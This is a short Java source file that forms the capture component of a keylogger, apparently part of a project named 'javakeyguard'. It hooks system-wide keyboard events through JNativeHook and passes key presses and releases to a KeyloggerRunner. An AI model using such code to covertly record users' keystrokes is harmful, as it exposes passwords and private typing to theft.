package com.keyguard.javakeyguard.keylogger.capture;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.keyguard.javakeyguard.keylogger.KeyloggerRunner;

public class GlobalKeyListener implements NativeKeyListener {

    private final KeyloggerRunner keyloggerRunner;

    public GlobalKeyListener(KeyloggerRunner keyloggerRunner) {
        this.keyloggerRunner = keyloggerRunner;
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        keyloggerRunner.handleKeyPressed(e);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        keyloggerRunner.handleKeyReleased();
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}